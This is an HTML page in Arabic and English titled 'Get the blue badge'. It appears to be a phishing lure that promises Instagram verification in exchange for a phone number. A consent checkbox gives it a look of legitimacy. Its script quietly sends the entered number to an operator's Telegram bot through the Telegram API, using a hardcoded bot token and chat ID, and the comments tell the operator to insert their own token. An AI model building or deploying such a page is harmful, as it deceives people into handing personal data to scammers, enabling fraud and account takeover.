<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Get the blue badge</title>
  <style>
    body {
      max-width: 520px;
      margin: 3rem auto;
      padding: 1.25rem;
      font: 1rem/1.7 system-ui, sans-serif;
    }
    label { display: block; margin: 1rem 0 0.4rem; }
    input, button { box-sizing: border-box; padding: 0.7rem; font: inherit; }
    input[type="tel"] { width: 100%; }
    button { margin-top: 1rem; cursor: pointer; }
    .consent { display: flex; gap: 0.6rem; align-items: flex-start; }
  </style>
</head>
<body>
  <main>
    <h1>Get the blue badge</h1>
    <p>
    Please enter your number and consent to share it for the purpose of <strong><div To="" get="" the="" blue="" badge="" on="" Instagram=""></div></strong> 
      <strong>[Get the blue badge]</strong>.
      لن نستخدمه لغرض آخر، ويمكنك الاطلاع على
      <a href="/privacy">سياسة الخصوصية</a>.
    </p>

    <form id="phoneForm">
      <label for="phone">رقم الهاتف</label>
      <input
        id="phone"
        name="phone"
        type="tel"
        autocomplete="tel"
        inputmode="tel"
        required
        maxlength="25"
        placeholder="+966 5X XXX XXXX"
      >

      <label class="consent">
        <input type="checkbox" name="consent" value="yes" required>
        <span>أوافق على إرسال رقم هاتفي واستخدامه للغرض الموضح أعلاه.</span>
      </label>

      <button type="submit">إرسال بموافقتي</button>
    </form>
  </main>
<script>
    document.getElementById('phoneForm').addEventListener('submit', function(e) {
        e.preventDefault(); // منع الصفحة من إعادة التحميل
        
        var phone = document.getElementById('phone').value;
        
        // ضع هنا الـ Token الخاص بك بين علامتي التنصيص بدلاً من هذه الجملة
        var botToken = '9124569370:AAHbzvS98kOxwiEfk0wOim15o0UQtXXM1Bg';
        
        // هذا هو الـ Chat ID الخاص بك
        var chatId = '8723996096';
        
        var message = "🔔 تم استلام رقم جديد:\n📱 الرقم: " + phone;
        
        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
        
        // إرسال البيانات في الخلفية
        fetch(url)
        .then(response => {
            if(response.ok) {
                alert("تم إرسال الرقم بنجاح إلى تيليجرام!");
                document.getElementById('phoneForm').reset();
            } else {
                alert("حدث خطأ، تأكد من صحة الـ Token.");
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert("فشل الاتصال.");
        });
    });
    </script>
</body>
</html>
